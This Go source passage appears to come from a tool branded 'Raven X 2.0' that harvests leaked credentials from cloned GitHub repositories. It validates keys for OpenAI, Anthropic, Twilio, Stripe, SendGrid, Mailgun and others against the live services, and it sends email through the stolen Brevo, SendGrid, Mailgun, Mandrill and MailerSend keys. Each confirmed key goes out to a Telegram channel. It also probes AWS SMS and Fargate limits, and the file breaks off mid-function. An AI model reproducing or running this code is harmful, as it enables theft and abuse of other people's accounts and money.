// SendEmailViaBrevo mengirim email menggunakan Brevo API
// fromEmail: email dari hasil validasi (dari account info)
func (a *AWSScanner) SendEmailViaBrevo(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari account info
	if fromEmail == "" {
		reqInfo, _ := http.NewRequest("GET", "https://api.brevo.com/v3/account", nil)
		reqInfo.Header.Set("api-key", key)
		respInfo, err := client.Do(reqInfo)
		if err == nil && respInfo.StatusCode == 200 {
			var accountInfo map[string]interface{}
			json.NewDecoder(respInfo.Body).Decode(&accountInfo)
			respInfo.Body.Close()

			if email, ok := accountInfo["email"].(string); ok && email != "" {
				fromEmail = email
			}

			if plan, ok := accountInfo["plan"].([]interface{}); ok && len(plan) > 0 {
				if planData, ok := plan[0].(map[string]interface{}); ok {
					if credits, ok := planData["credits"].(float64); ok {
						result["quota_limit"] = credits
						result["quota_remaining"] = credits
					}
				}
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"sender": map[string]interface{}{
			"name":  "Raven X 2.0",
			"email": fromEmail,
		},
		"to": []map[string]interface{}{
			{"email": a.Config.EmailTarget},
		},
		"subject": "Raven X 2.0 - Brevo Credential Test",
		"htmlContent": fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p>
<p>Credentials found at: %s</p>
<p>Key: %s</p>
<p>This email confirms that the Brevo credentials are working.</p>`, sourceURL, key),
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://api.brevo.com/v3/smtp/email", bytes.NewReader(jsonData))
	req.Header.Set("api-key", key)
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 201 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaSendGrid mengirim email menggunakan SendGrid API
// fromEmail: email dari hasil validasi (dari verified sender)
func (a *AWSScanner) SendEmailViaSendGrid(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari verified senders
	if fromEmail == "" {
		reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/verified_senders", nil)
		reqSenders.Header.Set("Authorization", "Bearer "+key)
		respSenders, err := client.Do(reqSenders)
		if err == nil && respSenders.StatusCode == 200 {
			var sendersResp map[string]interface{}
			json.NewDecoder(respSenders.Body).Decode(&sendersResp)
			respSenders.Body.Close()

			if results, ok := sendersResp["results"].([]interface{}); ok && len(results) > 0 {
				if firstSender, ok := results[0].(map[string]interface{}); ok {
					if email, ok := firstSender["from"].(map[string]interface{}); ok {
						if emailAddr, ok := email["email"].(string); ok && emailAddr != "" {
							fromEmail = emailAddr
						}
					}
				}
			}
		}
	}

	// Get account info untuk quota
	reqInfo, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
	reqInfo.Header.Set("Authorization", "Bearer "+key)
	respInfo, err := client.Do(reqInfo)
	if err == nil && respInfo.StatusCode == 200 {
		var creditInfo map[string]interface{}
		json.NewDecoder(respInfo.Body).Decode(&creditInfo)
		respInfo.Body.Close()

		if total, ok := creditInfo["total"].(float64); ok {
			result["quota_limit"] = total
			if remaining, ok := creditInfo["remain"].(float64); ok {
				result["quota_remaining"] = remaining
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"personalizations": []map[string]interface{}{
			{
				"to": []map[string]interface{}{
					{"email": a.Config.EmailTarget},
				},
			},
		},
		"from": map[string]interface{}{
			"email": fromEmail,
			"name":  "Raven X 2.0",
		},
		"subject": "Raven X 2.0 - SendGrid Credential Test",
		"content": []map[string]interface{}{
			{
				"type":  "text/html",
				"value": fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the SendGrid credentials are working.</p>`, sourceURL, key),
			},
		},
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://api.sendgrid.com/v3/mail/send", bytes.NewReader(jsonData))
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 202 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaMailgun mengirim email menggunakan Mailgun API
// fromEmail: email dari hasil validasi (dari domain yang tersedia)
func (a *AWSScanner) SendEmailViaMailgun(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0
	result["domains"] = []string{}

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Get domains
	reqDomains, _ := http.NewRequest("GET", "https://api.mailgun.net/v3/domains", nil)
	reqDomains.SetBasicAuth("api", key)
	respDomains, err := client.Do(reqDomains)
	var domain string
	if err == nil && respDomains.StatusCode == 200 {
		var domainsResp map[string]interface{}
		json.NewDecoder(respDomains.Body).Decode(&domainsResp)
		respDomains.Body.Close()

		if items, ok := domainsResp["items"].([]interface{}); ok && len(items) > 0 {
			if firstDomain, ok := items[0].(map[string]interface{}); ok {
				if name, ok := firstDomain["name"].(string); ok {
					domain = name
					domains := []string{}
					for _, item := range items {
						if d, ok := item.(map[string]interface{}); ok {
							if n, ok := d["name"].(string); ok {
								domains = append(domains, n)
							}
						}
					}
					result["domains"] = domains
				}
			}
		}
	}

	if domain == "" {
		result["error"] = "No domain found"
		return result
	}

	// Jika fromEmail tidak diberikan, gunakan domain yang ditemukan
	if fromEmail == "" {
		fromEmail = fmt.Sprintf("noreply@%s", domain)
	} else if !strings.Contains(fromEmail, "@") {
		// Jika fromEmail hanya username, tambahkan domain
		fromEmail = fmt.Sprintf("%s@%s", fromEmail, domain)
	}

	// Send email
	data := url.Values{}
	data.Set("from", fmt.Sprintf("Raven X 2.0 <%s>", fromEmail))
	data.Set("to", a.Config.EmailTarget)
	data.Set("subject", "Raven X 2.0 - Mailgun Credential Test")
	data.Set("html", fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the Mailgun credentials are working.</p>`, sourceURL, key))

	req, _ := http.NewRequest("POST", fmt.Sprintf("https://api.mailgun.net/v3/%s/messages", domain), strings.NewReader(data.Encode()))
	req.SetBasicAuth("api", key)
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaMandrill mengirim email menggunakan Mandrill API
// fromEmail: email dari hasil validasi (dari user info)
func (a *AWSScanner) SendEmailViaMandrill(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari user info
	if fromEmail == "" {
		payload := map[string]string{"key": key}
		jsonPayload, _ := json.Marshal(payload)
		reqInfo, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/users/info.json", bytes.NewReader(jsonPayload))
		reqInfo.Header.Set("Content-Type", "application/json")
		respInfo, err := client.Do(reqInfo)
		if err == nil && respInfo.StatusCode == 200 {
			var userInfo map[string]interface{}
			json.NewDecoder(respInfo.Body).Decode(&userInfo)
			respInfo.Body.Close()

			if username, ok := userInfo["username"].(string); ok && username != "" {
				// Mandrill menggunakan username sebagai from_email
				fromEmail = username
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"key": key,
		"message": map[string]interface{}{
			"from_email": fromEmail,
			"from_name":  "Raven X 2.0",
			"to": []map[string]interface{}{
				{"email": a.Config.EmailTarget, "type": "to"},
			},
			"subject": "Raven X 2.0 - Mandrill Credential Test",
			"html":    fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the Mandrill credentials are working.</p>`, sourceURL, key),
		},
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://mandrillapp.com/api/1.0/messages/send.json", bytes.NewReader(jsonData))
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var respData []interface{}
			json.NewDecoder(resp.Body).Decode(&respData)
			if len(respData) > 0 {
				if msgData, ok := respData[0].(map[string]interface{}); ok {
					if status, ok := msgData["status"].(string); ok && (status == "sent" || status == "queued") {
						result["success"] = true
					} else {
						result["error"] = fmt.Sprintf("Status: %v", status)
					}
				}
			}
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

// SendEmailViaMailerSend mengirim email menggunakan MailerSend API
// fromEmail: email dari hasil validasi (dari domain yang tersedia)
func (a *AWSScanner) SendEmailViaMailerSend(key, sourceURL string, fromEmail string) map[string]interface{} {
	result := make(map[string]interface{})
	result["success"] = false
	result["error"] = ""
	result["quota_limit"] = 0.0
	result["quota_remaining"] = 0.0

	if a.Config.EmailTarget == "" {
		result["error"] = "Email target not configured"
		return result
	}

	// Jika fromEmail tidak diberikan, ambil dari domain yang tersedia
	if fromEmail == "" {
		reqDomains, _ := http.NewRequest("GET", "https://api.mailersend.com/v1/domains", nil)
		reqDomains.Header.Set("Authorization", "Bearer "+key)
		reqDomains.Header.Set("X-Requested-With", "XMLHttpRequest")
		respDomains, err := client.Do(reqDomains)
		if err == nil && respDomains.StatusCode == 200 {
			var domainsResp map[string]interface{}
			json.NewDecoder(respDomains.Body).Decode(&domainsResp)
			respDomains.Body.Close()

			if data, ok := domainsResp["data"].([]interface{}); ok && len(data) > 0 {
				if firstDomain, ok := data[0].(map[string]interface{}); ok {
					if name, ok := firstDomain["name"].(string); ok && name != "" {
						fromEmail = fmt.Sprintf("noreply@%s", name)
					}
				}
			}
		}
	}

	// Jika masih tidak ada fromEmail, gunakan default
	if fromEmail == "" {
		fromEmail = "noreply@ravenx.local"
	}

	// Send email
	emailData := map[string]interface{}{
		"from": map[string]interface{}{
			"email": fromEmail,
			"name":  "Raven X 2.0",
		},
		"to": []map[string]interface{}{
			{"email": a.Config.EmailTarget},
		},
		"subject": "Raven X 2.0 - MailerSend Credential Test",
		"html":    fmt.Sprintf(`<p>This is a test email from Raven X 2.0 Scanner.</p><p>Credentials found at: %s</p><p>Key: %s</p><p>This email confirms that the MailerSend credentials are working.</p>`, sourceURL, key),
	}

	jsonData, _ := json.Marshal(emailData)
	req, _ := http.NewRequest("POST", "https://api.mailersend.com/v1/email", bytes.NewReader(jsonData))
	req.Header.Set("Authorization", "Bearer "+key)
	req.Header.Set("X-Requested-With", "XMLHttpRequest")
	req.Header.Set("Content-Type", "application/json")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 202 {
			result["success"] = true
		} else {
			bodyBytes, _ := ioutil.ReadAll(resp.Body)
			result["error"] = string(bodyBytes)
		}
	} else {
		result["error"] = err.Error()
	}

	return result
}

func (a *AWSScanner) checkSNSLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !a.Config.AWSChecks.SNSLimitCheck { // Menggunakan flag baru
		return map[string]float64{}
	}
	ctx := context.Background()
	results := make(map[string]float64)
	regions, _ := getAllRegions("sns")

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		snsClient := sns.NewFromConfig(cfg)
		out, err := snsClient.GetSMSAttributes(ctx, &sns.GetSMSAttributesInput{Attributes: []string{"MonthlySpendLimit"}})
		if err != nil {
			continue
		}
		if val, ok := out.Attributes["MonthlySpendLimit"]; ok {
			limit, _ := strconv.ParseFloat(val, 64)
			if limit > 0 {
				results[region] = limit
			}
		}
	}
	return results
}

func (a *AWSScanner) checkFargateOnDemandLimitAllRegions(cfg aws.Config) map[string]float64 {
	if !a.Config.AWSChecks.FargateLimitCheck { // Menggunakan flag baru
		return map[string]float64{}
	}
	ctx := context.Background()
	limits := make(map[string]float64)
	regions, _ := getAllRegions("fargate")

	ctx, cancel := context.WithTimeout(ctx, 45*time.Second)
	defer cancel()

	for _, region := range regions {
		cfg.Region = region
		client := servicequotas.NewFromConfig(cfg)
		quota, err := client.GetServiceQuota(ctx, &servicequotas.GetServiceQuotaInput{ServiceCode: aws.String("fargate"), QuotaCode: aws.String("L-F4011B99")})
		if err == nil && quota.Quota != nil && quota.Quota.Value != nil {
			limits[region] = *quota.Quota.Value
		}
	}
	return limits
}

func (a *AWSScanner) ScanRepo(token string, repo map[string]interface{}) {
	name, _ := repo["name"].(string)
	htmlUrl, _ := repo["html_url"].(string)
	if name == "" || htmlUrl == "" {
		return
	}

	cloneUrl := strings.Replace(htmlUrl, "https://", "https://"+token+"@", 1)
	targetDir := filepath.Join(a.TempDir, name)

	os.RemoveAll(targetDir)

	// Fetch last 50 commits across all branches so deleted secrets in recent
	// history are visible. Full clone is avoided to cap disk/time usage.
	ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
	defer cancel()

	cmd := exec.CommandContext(ctx, "git", "clone", "--no-single-branch", "--depth", "50", cloneUrl, targetDir)
	if err := cmd.Run(); err != nil {
		if ctx.Err() == context.DeadlineExceeded {
			pterm.Debug.Printfln("Clone timeout for %s after 60s", name)
		} else {
			pterm.Debug.Printfln("Failed to clone %s: %v", name, err)
		}
		return
	}

	// Scan files dengan kontrol goroutine yang ketat
	var wg sync.WaitGroup
	fileSem := make(chan struct{}, 20) // Batasi scanning file secara bersamaan

	filepath.WalkDir(targetDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		if d.Name() == ".git" {
			return fs.SkipDir
		}
		ext := strings.ToLower(filepath.Ext(path))
		if IsIgnoredExt(ext) {
			return nil
		}

		contentBytes, errRead := ioutil.ReadFile(path)
		if errRead != nil || len(contentBytes) > 1024000 {
			return nil
		}

		if bytes.Contains(contentBytes, []byte{0}) {
			return nil
		}

		wg.Add(1)
		fileSem <- struct{}{}
		go func(c, s string) {
			defer wg.Done()
			defer func() { <-fileSem }()
			a.checkAndSaveKeys(c, s)
		}(string(contentBytes), fmt.Sprintf("Repo: %s | File: %s", name, filepath.Base(path)))
		return nil
	})
	wg.Wait()
	os.RemoveAll(targetDir)
}

// do429Retry executes req with rate-limit (HTTP 429) and transient 5xx retry handling.
//
// Behavior:
//   - On 429: parses Retry-After (integer seconds, default 2s) and sleeps that long, then retries.
//   - On >= 500: logs and retries once with a 1s sleep.
//   - Otherwise returns the response immediately.
//   - Total attempts capped at maxAttempts (defaults to 3 when <= 0).
//
// Requests are cloned via req.Clone(req.Context()) for each retry so a consumed body
// does not break replay (Go gotcha: http.Request body is a one-shot ReadCloser).
func do429Retry(client *http.Client, req *http.Request, maxAttempts int) (*http.Response, error) {
	if maxAttempts <= 0 {
		maxAttempts = 3
	}

	var lastResp *http.Response
	var lastErr error
	fiveXXRetried := false

	for attempt := 1; attempt <= maxAttempts; attempt++ {
		// Clone for each attempt — once a request body is consumed, the original cannot be replayed.
		attemptReq := req.Clone(req.Context())

		resp, err := client.Do(attemptReq)
		lastResp, lastErr = resp, err
		if err != nil {
			return resp, err
		}

		if resp.StatusCode == 429 {
			retryAfter := 2
			if ra := resp.Header.Get("Retry-After"); ra != "" {
				if secs, perr := strconv.Atoi(strings.TrimSpace(ra)); perr == nil && secs > 0 {
					retryAfter = secs
				}
			}
			pterm.Debug.Printfln("[do429Retry] 429 received, sleeping %ds (attempt %d/%d)", retryAfter, attempt, maxAttempts)
			if attempt == maxAttempts {
				// Last attempt — hand the 429 response back to the caller (don't close the body).
				return resp, nil
			}
			resp.Body.Close()
			time.Sleep(time.Duration(retryAfter) * time.Second)
			continue
		}

		if resp.StatusCode >= 500 {
			if fiveXXRetried || attempt == maxAttempts {
				// No more retries — return the response for the caller to inspect.
				return resp, nil
			}
			pterm.Debug.Printfln("[do429Retry] %d received, retrying once after 1s (attempt %d/%d)", resp.StatusCode, attempt, maxAttempts)
			resp.Body.Close()
			fiveXXRetried = true
			time.Sleep(1 * time.Second)
			continue
		}

		return resp, nil
	}

	return lastResp, lastErr
}

// Fungsi untuk mengecek validitas OpenAI
func (a *AWSScanner) CheckOpenAI(key, sourceURL string) bool {
	if !a.Config.APIValidation.OpenAI && !a.Config.APIValidation.AIAll { // gate: per-vendor OR master AI toggle
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.openai.com/v1/models", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			a.logValid("OpenAI", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_openai.txt")
			a.storeValidKeyLimit("OpenAI", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🧠 <b>OPENAI LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 401 {
			pterm.Debug.Printfln("[OpenAI] Key %s is invalid (401).", key)
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Anthropic
func (a *AWSScanner) CheckAnthropic(key, sourceURL string) bool {
	if !a.Config.APIValidation.Anthropic && !a.Config.APIValidation.AIAll { // gate: per-vendor OR master AI toggle
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	// Endpoint sederhana untuk memeriksa status API key
	req, _ := http.NewRequest("GET", "https://api.anthropic.com/v1/models", nil)
	req.Header.Set("x-api-key", key)
	req.Header.Set("anthropic-version", "2023-10-01") // Versi API yang disyaratkan (next stable after 2023-06-01)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()

		if resp.StatusCode == 200 {
			a.logValid("Anthropic", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_anthropic.txt")
			a.storeValidKeyLimit("Anthropic", key, "Active")

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
🧠 <b>ANTHROPIC LIVE KEY</b>

🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		} else if resp.StatusCode == 401 {
			pterm.Debug.Printfln("[Anthropic] Key %s is invalid (401).", key)
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Twilio
func (a *AWSScanner) CheckTwilio(sid, auth, sourceURL string) bool {
	if !a.Config.APIValidation.Twilio { // Pengecekan fitur baru
		return false
	}

	// Tighten SID validation: must match AC + 32 lowercase hex chars exactly (Account SID format)
	// before any HTTP call is made. Cuts false-positive validation traffic from loose extractor regex.
	if !regexp.MustCompile(`^AC[a-f0-9]{32}$`).MatchString(sid) {
		return false
	}

	pair := sid + ":" + auth
	if _, loaded := a.KnownKeys.LoadOrStore(pair, true); loaded {
		return false
	}

	globalCounters.mu.Lock()
	globalCounters.APIsFoundTotal++
	globalCounters.mu.Unlock()

	req, _ := http.NewRequest("GET", fmt.Sprintf("https://api.twilio.com/2010-04-01/Accounts/%s.json", sid), nil)
	req.SetBasicAuth(sid, auth)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			status, _ := res["status"].(string)
			friendlyName, _ := res["friendly_name"].(string)

			a.logValid("Twilio", fmt.Sprintf("SID: %s | Status: %s", sid, status))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s", sanitizeSource(sourceURL), sid, auth), "valid_twilio.txt")
			a.storeValidKeyLimit("Twilio", sid, fmt.Sprintf("%s (%s)", friendlyName, status))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📞 <b>TWILIO LIVE ACCOUNT</b>

🆔 <b>SID:</b> <code>%s</code>
🔐 <b>Auth:</b> <code>%s</code>
📶 <b>Status:</b> %s
🔗 <b>Source:</b> %s
`, sid, auth, status, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas SendGrid
func (a *AWSScanner) CheckSendGrid(key, sourceURL string) bool {
	if !a.Config.APIValidation.SendGrid { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/user/credits", nil)
	req.Header.Set("Authorization", "Bearer "+key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			total, _ := res["total"].(float64)

			// Ambil fromEmail dari verified senders
			var fromEmail string
			reqSenders, _ := http.NewRequest("GET", "https://api.sendgrid.com/v3/verified_senders", nil)
			reqSenders.Header.Set("Authorization", "Bearer "+key)
			respSenders, err := client.Do(reqSenders)
			if err == nil && respSenders.StatusCode == 200 {
				var sendersResp map[string]interface{}
				json.NewDecoder(respSenders.Body).Decode(&sendersResp)
				respSenders.Body.Close()
				if results, ok := sendersResp["results"].([]interface{}); ok && len(results) > 0 {
					if firstSender, ok := results[0].(map[string]interface{}); ok {
						if email, ok := firstSender["from"].(map[string]interface{}); ok {
							if emailAddr, ok := email["email"].(string); ok && emailAddr != "" {
								fromEmail = emailAddr
							}
						}
					}
				}
			}

			// Coba kirim email
			emailResult := a.SendEmailViaSendGrid(key, sourceURL, fromEmail)

			a.logValid("SendGrid", key)
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_sendgrid.txt")

			emailStatus := "❌ Failed"
			quotaInfo := fmt.Sprintf("%.0f Total Credits", total)
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
						quotaInfo = fmt.Sprintf("%.0f/%.0f Credits (Remaining: %.0f)", quotaRemaining, quotaLimit, quotaRemaining)
					}
				}
			}
			a.storeValidKeyLimit("SendGrid", key, quotaInfo)

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			quotaDetails := ""
			if emailResult["success"].(bool) {
				if quotaLimit, ok := emailResult["quota_limit"].(float64); ok {
					if quotaRemaining, ok2 := emailResult["quota_remaining"].(float64); ok2 {
						quotaDetails = fmt.Sprintf("\n📊 <b>Quota Limit:</b> %.0f\n📬 <b>Remaining:</b> %.0f", quotaLimit, quotaRemaining)
					}
				}
			}

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
📧 <b>SENDGRID KEY FOUND</b>

🔑 <b>Key:</b> <code>%s</code>
📊 <b>Limit:</b> %s
📧 <b>Email Test:</b> %s%s
🔗 <b>Source:</b> %s
`, key, quotaInfo, emailStatus, quotaDetails, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Stripe
func (a *AWSScanner) CheckStripe(key, sourceURL string) bool {
	if !a.Config.APIValidation.Stripe { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.stripe.com/v1/balance", nil)
	req.SetBasicAuth(key, "")

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := client.Do(req.WithContext(ctx))
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			liveMode, _ := res["livemode"].(bool)

			mode := "Test"
			keyType := "Secret Key"
			if liveMode {
				mode = "Live"
			}

			// Detect key type
			if strings.HasPrefix(key, "sk_") {
				keyType = "Secret Key"
			} else if strings.HasPrefix(key, "pk_") {
				keyType = "Publishable Key"
			} else if strings.HasPrefix(key, "rk_") {
				keyType = "Restricted Key"
			}

			a.logValid("Stripe", fmt.Sprintf("%s | Mode: %s | Key: %s", keyType, mode, key))
			a.saveIntoFile(fmt.Sprintf("%s:%s:%s:%s", sanitizeSource(sourceURL), keyType, mode, key), "valid_stripe.txt")
			a.storeValidKeyLimit("Stripe", key, fmt.Sprintf("%s (%s)", keyType, mode))

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
━━━━━━━━━━━━━━━━━━
💳 <b>STRIPE KEY FOUND</b>

🔐 <b>Type:</b> %s
💰 <b>Mode:</b> %s
🔑 <b>Key:</b> <code>%s</code>
🔗 <b>Source:</b> %s
`, keyType, mode, key, sourceURL)
			go a.sendTelegram(msg)
			return true
		}
	}
	return false
}

// Fungsi untuk mengecek validitas Mailgun
func (a *AWSScanner) CheckMailgun(key, sourceURL string) bool {
	if !a.Config.APIValidation.Mailgun { // Pengecekan fitur baru
		return false
	}

	if _, loaded := a.KnownKeys.LoadOrStore(key, true); loaded {
		return false
	}

	req, _ := http.NewRequest("GET", "https://api.mailgun.net/v3/domains", nil)
	req.SetBasicAuth("api", key)

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()

	resp, err := do429Retry(client, req.WithContext(ctx), 3)
	if err == nil {
		defer resp.Body.Close()
		if resp.StatusCode == 200 {
			var res map[string]interface{}
			json.NewDecoder(resp.Body).Decode(&res)
			total, _ := res["total_count"].(float64)

			// Ambil fromEmail dari domain yang tersedia
			var fromEmail string
			if items, ok := res["items"].([]interface{}); ok && len(items) > 0 {
				if firstDomain, ok := items[0].(map[string]interface{}); ok {
					if domainName, ok := firstDomain["name"].(string); ok && domainName != "" {
						fromEmail = fmt.Sprintf("noreply@%s", domainName)
					}
				}
			}

			// Coba kirim email
			emailResult := a.SendEmailViaMailgun(key, sourceURL, fromEmail)

			a.logValid("Mailgun", fmt.Sprintf("Key: %s | Domains: %.0f", key, total))
			a.saveIntoFile(fmt.Sprintf("%s:%s", sanitizeSource(sourceURL), key), "valid_mailgun.txt")

			emailStatus := "❌ Failed"
			domainInfo := fmt.Sprintf("%.0f Domains", total)
			if emailResult["success"].(bool) {
				emailStatus = "✅ Success"
				if domains, ok := emailResult["domains"].([]string); ok && len(domains) > 0 {
					domainInfo = fmt.Sprintf("%.0f Domains (%s)", total, strings.Join(domains, ", "))
				}
			}
			a.storeValidKeyLimit("Mailgun", key, domainInfo)

			globalCounters.mu.Lock()
			globalCounters.APIsValidated++
			globalCounters.mu.Unlock()

			domainDetails := ""
			if emailResult["success"].(bool) {
				if domains, ok := emailResult["domains"].([]string); ok && len(domains) > 0 {
